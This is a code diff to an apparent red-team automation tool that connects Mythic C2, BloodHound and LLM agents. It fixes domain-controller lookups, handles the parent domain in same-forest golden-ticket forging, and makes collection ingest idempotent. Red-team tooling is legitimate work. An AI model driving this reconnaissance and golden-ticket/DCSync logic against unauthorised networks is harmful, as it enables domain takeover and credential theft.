+                inputs["child_dc_source"] = f"BloodHound Domain Controllers membership for {domain}"
 
         if not self._capability_has_ticket_key(inputs):
             credential = await self._select_krbtgt_credential(domain)
@@ -9037,13 +9469,16 @@ class MythicTools:
         if cypher_tool is None:
             return ""
         safe_domain = domain_cf.replace("\\", "").replace("'", "")
+        # EXACT-domain match only: a DC belongs to its OWN domain's Domain Controllers (-516) group, so
+        # c.domain / g.domain == the queried domain. The previous `c.name ENDS WITH '.<domain>'` clause also
+        # matched CHILD-subdomain DCs (e.g. DC01.CHILD.ROOT.EXAMPLE.LOCAL matched 'root.example.local'),
+        # so resolving a PARENT domain could return the child DC and break cross-domain dcsync/proof. Range-
+        # agnostic (Silas/Forge confirmed).
         query = (
             "MATCH (c:Computer)-[:MemberOf*1..]->(g:Group) "
             "WHERE g.objectid ENDS WITH '-516' AND ("
             f"toLower(c.domain) = '{safe_domain}' OR "
-            f"toLower(g.domain) = '{safe_domain}' OR "
-            f"toLower(c.name) ENDS WITH '.{safe_domain}' OR "
-            f"toLower(g.name) ENDS WITH '@{safe_domain}') "
+            f"toLower(g.domain) = '{safe_domain}') "
             "RETURN DISTINCT c.name AS name ORDER BY name LIMIT 5"
         )
         try:
@@ -9591,6 +10026,19 @@ class MythicTools:
             intent.get("effect_domain") or target_fields.get("target_domain")
         ).casefold()
 
+    def _cross_domain_forge_parent(self, action, inputs: dict) -> str:
+        """The PARENT domain of a SAME-FOREST child->parent forge-golden-ticket, else "". Same-forest only: the
+        parent must be a DNS suffix of the child (child.root.example.local -> root.example.local). A
+        cross-FOREST target (other.example.local) has no implicit Enterprise-Admins path to the parent and must never be
+        granted replication rights — so it returns "" and the DCSync precheck still applies."""
+        if self._capability_text(getattr(action, "name", "")).casefold() != "forge-golden-ticket":
+            return ""
+        child = self._capability_domain(action, inputs).strip(".")
+        parent = self._capability_target_domain(action, inputs).strip(".")
+        if not child or not parent or child == parent:
+            return ""
+        return parent if child.endswith("." + parent) else ""
+
     def _capability_account(self, action, inputs: dict) -> str:
         intent = getattr(action, "intent", {}) if isinstance(getattr(action, "intent", {}), dict) else {}
         target_fields = {}
@@ -9998,6 +10446,7 @@ class MythicTools:
             return
         if SAGE_ENGAGEMENT_ID and SAGE_ENGAGEMENT_ID != "default":
             self._engagement_key = SAGE_ENGAGEMENT_ID   # explicit override wins; pin it, never query
+            _publish_active_engagement_id(self._engagement_key)
             try:
                 self._load_engagement_ledger(replace=True)
             except Exception:
@@ -10016,6 +10465,7 @@ class MythicTools:
                 key = None
             if key:
                 self._engagement_key = key
+                _publish_active_engagement_id(key)
                 # Reload under the operation key before any planner/gate decision uses durable state.
                 try:
                     self._load_engagement_ledger(replace=True)
@@ -10065,6 +10515,7 @@ class MythicTools:
             objective = self._human_engagement_objective(payload.get("objective"))
             if objective:
                 self._engagement_objective_text = objective
+                self._engagement_objective_source = str(payload.get("objective_source") or "")
         items = payload.get("hops") if isinstance(payload, dict) else payload
         try:
             from . import engagement_state
@@ -10126,6 +10577,9 @@ class MythicTools:
         payload = {
             "engagement_id": self._eng_key(),
             "objective": self._engagement_objective(),
+            # _engagement_objective() above refreshes/adopts and updates the source mirror; preserve it so a
+            # hop-persist never silently drops provenance (which would make an auto objective look operator-set).
+            "objective_source": getattr(self, "_engagement_objective_source", "") or None,
             "updated": datetime.now(timezone.utc).isoformat(),
             "hops": engagement_state.hops_to_dicts(self._engagement_hops),
             "graph_facts": engagement_state.graph_facts_to_dicts(
@@ -10305,6 +10759,11 @@ class MythicTools:
                     filename_utf8
                     chunks_received
                     total_chunks
+                    task {
+                        callback {
+                            display_id
+                        }
+                    }
                 }
             }
         """
@@ -10439,12 +10898,24 @@ class MythicTools:
         encoded_content = base64.b64encode(file_content).decode('utf-8')
         return encoded_content
 
+    def _collection_already_ingested(self, file_content: bytes) -> tuple[str, str | None]:
+        """(content_sha256, prior_job_id_or_None): idempotency key for a collection ZIP keyed by CONTENT, not
+        by callback/foothold (the old graph-built gate missed re-ingests when callback_display_id was None)."""
+        import hashlib
+        h = hashlib.sha256(file_content).hexdigest()
+        return h, self._ingested_collection_hashes.get(h)
+
+    def _record_collection_ingested(self, content_hash: str, job_id) -> None:
+        """Record a VERIFIED ingest so the identical artifact is not re-uploaded. Best-effort; never raises."""
+        self._ingested_collection_hashes[content_hash] = str(job_id) if job_id is not None else "complete"
+
     async def ingest_collection(
         self,
         file_uuid: Annotated[str, "The Mythic file UUID of the downloaded SharpHound/AzureHound collection to ingest. PREFERRED. Optional if callback_display_id is given."] = "",
         callback_display_id: Annotated[int | None, "If set (and file_uuid empty), resolve the MOST RECENT completed collection download from this callback and ingest that."] = None,
         file_name: Annotated[str, "Optional basename for the collection (e.g. 'collection.zip'). Defaults to the source filename or <uuid>.zip."] = "",
         name_contains: Annotated[str, "When resolving by callback, only match files whose name contains this substring (default 'zip')."] = "zip",
+        collection_scope_domain: Annotated[str, "Optional targeted SharpHound --Domain scope. Leave empty for the default --SearchForest collection. Used only for deterministic collection idempotency."] = "",
     ) -> str:
         """Ingest a downloaded SharpHound/AzureHound collection straight into BloodHound in-memory (bytes never touch the LLM or Sage disk); pass file_uuid, or callback_display_id to use that callback's latest download.
 
@@ -10459,6 +10930,17 @@ class MythicTools:
         # 1. Resolve the Mythic file UUID (by UUID, or the latest completed download on a callback).
         if file_uuid:
             resolved_by = "uuid"
+            if callback_display_id is None:
+                try:
+                    meta = await self._get_file_metadata(file_uuid)
+                    source_callback = (
+                        ((meta or {}).get("task") or {}).get("callback") or {}
+                    ).get("display_id")
+                    if source_callback is not None:
+                        callback_display_id = int(source_callback)
+                        resolved_by = f"uuid:callback:{callback_display_id}"
+                except Exception:
+                    pass
         elif callback_display_id is not None:
             row = await self._latest_download_for_callback(callback_display_id, name_contains)
             if row is None:
@@ -10488,7 +10970,7 @@ class MythicTools:
         safe_name = os.path.basename(file_name) if file_name else f"{file_uuid}.zip"
         if not _looks_like_bloodhound_collection_zip(file_content):
             try:
-                await self._record_graph_built(callback_display_id, False)
+                await self._record_graph_built(callback_display_id, False, collection_scope_domain=collection_scope_domain)
             except Exception:
                 pass
             return json.dumps({
@@ -10501,6 +10983,36 @@ class MythicTools:
                     "the collection command likely failed or printed help/usage. Retry collection with valid "
                     "collector arguments, then download and ingest the resulting ZIP."
                 ),
+            }, sort_keys=True)
+        # Idempotency at the EXECUTION boundary: if this EXACT collection (by content hash) was already ingested
+        # and verified this engagement, do NOT re-upload/re-ingest — short-circuit with the prior job. Prevents
+        # the duplicate external work the supervisor loop otherwise triggers (the 4x-identical-zip case). P0.
+        content_hash, prior_job = self._collection_already_ingested(file_content)
+        if prior_job is not None:
+            # Record graph-built at the CURRENT access key before short-circuiting. The bytes were ingested+
+            # verified earlier, but if this is a NEW access key (e.g. host re-collected after a privilege
+            # change, identical graph bytes), the graph-built hop for THIS key may not exist yet — without
+            # recording it the collection gate stays 'missing' and the caller re-collects the identical ZIP in
+            # a loop (Forge N3). Best-effort, fail-open.
+            covered_domains = await _bloodhound_collected_domains()
+            try:
+                await self._record_graph_built(
+                    callback_display_id,
+                    True,
+                    covered_domains=covered_domains,
+                    collection_scope_domain=collection_scope_domain,
+                )
+            except Exception:
+                pass
+            return json.dumps({
+                "status": "already_ingested", "file_uuid": file_uuid, "filename": safe_name,
+                "bytes": len(file_content), "content_sha256": content_hash[:16],
+                "bloodhound_job_id": prior_job, "idempotent_skip": True, "graph_verified": True,
+                "source_callback_display_id": callback_display_id,
+                "covered_domains": covered_domains,
+                "next_action": ("This exact collection (by content hash) was already ingested and verified this "
+                                "engagement; the graph is populated. Do NOT re-upload or re-collect. Hand off to "
+                                "the BloodHound agent for attack-path analysis."),
             }, sort_keys=True)
         # 3. Resolve the BloodHound MCP's file_upload + domain_info tools (generic; no Mythic knowledge).
         upload_tool = None
@@ -10535,23 +11047,16 @@ class MythicTools:
         #    file_upload(info_type="status", job_id=...) until status_message == "Complete" (or a failure /
         #    timeout). This is definitive: it distinguishes Complete vs still-ingesting vs Failed, regardless
         #    of whether the domain count changed (handles re-ingest of an already-populated collection).
-        def _mcp_data(resp):
-            try:
-                text = resp
-                if isinstance(resp, list) and resp and isinstance(resp[0], dict):
-                    text = resp[0].get("text", "")
-                parsed = json.loads(text) if isinstance(text, str) else (text or {})
-                return parsed.get("data") if isinstance(parsed, dict) else None
-            except Exception:
-                return None
-        up = _mcp_data(result)
+        up = _mcp_response_data(result)
         job_id_bh = up.get("job_id") if isinstance(up, dict) else None
         status_msg = None
         if job_id_bh is not None:
             for _ in range(20):  # up to ~120s of async-ingest wait
                 await asyncio.sleep(6)
                 try:
-                    st = _mcp_data(await upload_tool.ainvoke({"info_type": "status", "job_id": job_id_bh}))
+                    st = _mcp_response_data(
+                        await upload_tool.ainvoke({"info_type": "status", "job_id": job_id_bh})
+                    )
                 except Exception:
                     st = None
                 status_msg = st.get("status_message") if isinstance(st, dict) else None
@@ -10562,6 +11067,11 @@ class MythicTools:
         verified = (status_msg == "Complete")
         failed = status_msg in ("Failed", "Canceled")
         status_out = "ingested" if verified else ("ingest_failed" if failed else "uploaded_pending_ingest")
+        covered_domains = (
+            await _bloodhound_collected_domains(info_tool)
+            if verified
+            else []
+        )
         # Loop-breaker: once the graph is populated the forward planner can name the next hop. Refresh the
         # cached graph facts so the per-turn injection surfaces NEXT GROUNDED ACTIONS (graph ACL edges →
         # available hops) and the operator advances instead of re-collecting. Fire on EVERY ingest (not
@@ -10574,13 +11084,22 @@ class MythicTools:
         # Record the collect-graph effect (graph-built at this access level) so re-collection is gated, and
         # clear the in-flight marker. Keyed by the resolving callback's foothold. Best-effort, fail-open.
         try:
-            await self._record_graph_built(callback_display_id, verified)
+            await self._record_graph_built(
+                callback_display_id,
+                verified,
+                covered_domains=covered_domains,
+                collection_scope_domain=collection_scope_domain,
+            )
         except Exception:
             pass
+        if verified:
+            self._record_collection_ingested(content_hash, job_id_bh)  # idempotency: don't re-ingest this artifact
         return json.dumps({"status": status_out, "file_uuid": file_uuid, "filename": safe_name,
                            "bytes": len(file_content), "resolved_by": resolved_by,
+                           "source_callback_display_id": callback_display_id,
                            "bloodhound_job_id": job_id_bh, "job_status": status_msg,
                            "graph_verified": verified,
+                           "covered_domains": covered_domains,
                            "bloodhound_response": str(result)[:300],
                            "next_action": (
                                f"BloodHound ingest job {job_id_bh} is COMPLETE — the graph is populated. Hand off "
